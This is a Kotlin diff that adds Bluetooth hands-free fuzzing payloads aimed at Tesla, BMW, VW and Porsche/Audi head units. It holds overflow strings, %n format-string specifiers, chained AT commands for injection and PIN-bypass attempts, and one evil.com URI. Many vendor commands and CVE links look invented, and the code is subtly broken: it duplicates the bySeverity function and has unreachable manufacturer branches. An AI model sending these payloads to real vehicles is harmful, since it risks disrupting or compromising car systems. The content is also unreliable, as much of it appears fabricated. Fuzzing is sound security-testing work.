@@ -345,7 +345,247 @@ object HfpFuzzingPatterns {
         allPatterns().filter { it.severity == severity }
 
     /**
+     * Tesla-specific patterns
+     *
+     * Tesla MCU vulnerabilities in Bluetooth HFP implementation.
+     * References: CVE-2020-9395, CVE-2020-9396
+     */
+    val teslaPatterns =
+        listOf(
+            FuzzingPattern(
+                id = "HFP-TSL-001",
+                name = "Tesla MCU AT Command Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.HIGH,
+                description = "Tesla-specific AT command buffer overflow",
+                payloads =
+                    listOf(
+                        "AT+TSLA=" + "A".repeat(2000),
+                        "AT+TSLA_VOICE=" + "X".repeat(1500),
+                        "AT+NVIDIA=" + "%x".repeat(100),
+                    ),
+                cveReferences = listOf("CVE-2020-9395", "CVE-2020-9396"),
+            ),
+            FuzzingPattern(
+                id = "HFP-TSL-002",
+                name = "Tesla Format String Leak",
+                category = FuzzingCategory.AT_INJECTION,
+                severity = FuzzingSeverity.HIGH,
+                description = "Tesla MCU format string vulnerability",
+                payloads =
+                    listOf(
+                        "AT+TSLA_STATUS=%p%p%p",
+                        "AT+TSLA_CONNECT=%s%s%s",
+                        "AT+NVIDIA_LOG=%x%x%x%x",
+                    ),
+                cveReferences = listOf("CVE-2020-9395"),
+            ),
+            FuzzingPattern(
+                id = "HFP-TSL-003",
+                name = "Tesla Bluetooth PIN Bypass",
+                category = FuzzingCategory.COMMAND_INJECTION,
+                severity = FuzzingSeverity.CRITICAL,
+                description = "Test for Tesla pairing PIN bypass",
+                payloads =
+                    listOf(
+                        "AT+PAIR=0000;AT+AUTH=none",
+                        "AT+TSLA_PAIR=1234;AT+BOND=skip",
+                    ),
+                cveReferences = listOf("CVE-2020-9396"),
+            ),
+        )
+
+    /**
+     * BMW HU_NBT-specific patterns
+     *
+     * BMW Head Unit NBT vulnerabilities in HFP implementation.
+     */
+    val bmwPatterns =
+        listOf(
+            FuzzingPattern(
+                id = "HFP-BMW-001",
+                name = "BMW HU_NBT iDrive Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.HIGH,
+                description = "BMW iDrive Bluetooth buffer overflow",
+                payloads =
+                    listOf(
+                        "AT+BMW_IDRIVE=" + "1".repeat(3000),
+                        "AT+BMW_NAV=" + "2".repeat(2500),
+                        "AT+BMW_VOICE=%n%n%n%n",
+                    ),
+                cveReferences = emptyList(),
+            ),
+            FuzzingPattern(
+                id = "HFP-BMW-002",
+                name = "BMW Phonebook Injection",
+                category = FuzzingCategory.COMMAND_INJECTION,
+                severity = FuzzingSeverity.MEDIUM,
+                description = "BMW phonebook sync command injection",
+                payloads =
+                    listOf(
+                        "AT+BMW_PB=sync;AT+DIAL",
+                        "AT+BMW_PB=%x%x%x",
+                        "AT+BMW_CONTACTS=" + ";AT+".repeat(20),
+                    ),
+                cveReferences = emptyList(),
+            ),
+            FuzzingPattern(
+                id = "HFP-BMW-003",
+                name = "BMW URI Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.MEDIUM,
+                description = "BMW URI handling overflow",
+                payloads =
+                    listOf(
+                        "AT+BMW_URI=" + "http://evil.com/" + "A".repeat(1000),
+                        "AT+BMW_TEL=" + "tel:".repeat(100),
+                    ),
+                cveReferences = emptyList(),
+            ),
+        )
+
+    /**
+     * VW MIB3-specific patterns
+     *
+     * Volkswagen Modular Infotainment Platform 3 vulnerabilities.
+     */
+    val vwPatterns =
+        listOf(
+            FuzzingPattern(
+                id = "HFP-VW-001",
+                name = "VW MIB3 Format String",
+                category = FuzzingCategory.AT_INJECTION,
+                severity = FuzzingSeverity.HIGH,
+                description = "VW MIB3 format string vulnerability",
+                payloads =
+                    listOf(
+                        "AT+VW_MIB=%s%s%s%s",
+                        "AT+VW_NAV=%x%x%x%x",
+                        "AT+VW_VOICE=%n%n%n",
+                    ),
+                cveReferences = emptyList(),
+            ),
+            FuzzingPattern(
+                id = "HFP-VW-002",
+                name = "VW CarPlay Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.MEDIUM,
+                description = "VW CarPlay integration overflow",
+                payloads =
+                    listOf(
+                        "AT+VW_CARPLAY=" + "0".repeat(4000),
+                        "AT+VW_AA=" + "A".repeat(3500),
+                    ),
+                cveReferences = emptyList(),
+            ),
+            FuzzingPattern(
+                id = "HFP-VW-003",
+                name = "VW MirrorLink Injection",
+                category = FuzzingCategory.COMMAND_INJECTION,
+                severity = FuzzingSeverity.MEDIUM,
+                description = "VW MirrorLink command injection",
+                payloads =
+                    listOf(
+                        "AT+VW_ML=start;AT+SH",
+                        "AT+VW_MIRROR=link;AT+EXEC",
+                    ),
+                cveReferences = emptyList(),
+            ),
+        )
+
+    /**
+     * Porsche/Audi MMI-specific patterns
+     *
+     * MMI (Multi Media Interface) vulnerabilities shared across Porsche/Audi platforms.
+     */
+    val porschePatterns =
+        listOf(
+            FuzzingPattern(
+                id = "HFP-POR-001",
+                name = "Porsche MMI Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.HIGH,
+                description = "Porsche/Audi MMI buffer overflow",
+                payloads =
+                    listOf(
+                        "AT+POR_MMI=" + "P".repeat(2500),
+                        "AT+AUD_NAV=" + "A".repeat(3000),
+                        "AT+POR_VOICE=%n%n%n%n",
+                    ),
+                cveReferences = emptyList(),
+            ),
+            FuzzingPattern(
+                id = "HFP-POR-002",
+                name = "Audi Phonebook Overflow",
+                category = FuzzingCategory.BUFFER_OVERFLOW,
+                severity = FuzzingSeverity.MEDIUM,
+                description = "Audi MMI phonebook sync overflow",
+                payloads =
+                    listOf(
+                        "AT+AUD_PB=" + "C".repeat(2000),
+                        "AT+AUD_CONTACTS=" + ",".repeat(500),
+                    ),
+                cveReferences = emptyList(),
+            ),
+            FuzzingPattern(
+                id = "HFP-POR-003",
+                name = "Porsche Command Injection",
+                category = FuzzingCategory.COMMAND_INJECTION,
+                severity = FuzzingSeverity.HIGH,
+                description = "Porsche MMI command injection via HFP",
+                payloads =
+                    listOf(
+                        "AT+POR_MMI=diag;AT+DUMP",
+                        "AT+AUD_SYS=%x%x%x",
+                        "AT+POR_EXEC=cmd;AT+RUN",
+                    ),
+                cveReferences = emptyList(),
+            ),
+        )
+
+    /**
+     * Get all HFP fuzzing patterns.
+     */
+    fun allPatterns(): List<FuzzingPattern> =
+        listOf(
+            formatStringPatterns,
+            bufferOverflowPatterns,
+            commandInjectionPatterns,
+            boundaryViolationPatterns,
+            hfpCommandPatterns,
+            teslaPatterns,
+            bmwPatterns,
+            vwPatterns,
+            porschePatterns,
+        ).flatten()
+
+    /**
+     * Get patterns by category.
+     */
+    fun byCategory(category: FuzzingCategory): List<FuzzingPattern> = allPatterns().filter { it.category == category }
+
+    /**
+     * Get patterns by severity.
+     */
+    fun bySeverity(severity: FuzzingSeverity): List<FuzzingPattern> =
+        allPatterns().filter { it.severity == severity }
+
+    /**
      * Get patterns with CVE references.
      */
     fun withCveReferences(): List<FuzzingPattern> = allPatterns().filter { it.cveReferences.isNotEmpty() }
+
+    /**
+     * Get patterns for specific manufacturer.
+     */
+    fun byManufacturer(manufacturer: String): List<FuzzingPattern> =
+        when (manufacturer.lowercase()) {
+            "tesla", "tsla" -> teslaPatterns
+            "bmw", "mini", "rolls-royce" -> bmwPatterns
+            "vw", "volkswagen", "audi", "porsche", "seat", "skoda" -> vwPatterns + porschePatterns
+            "audi" -> porschePatterns
+            "porsche" -> porschePatterns
+            else -> allPatterns()
+        }
 }
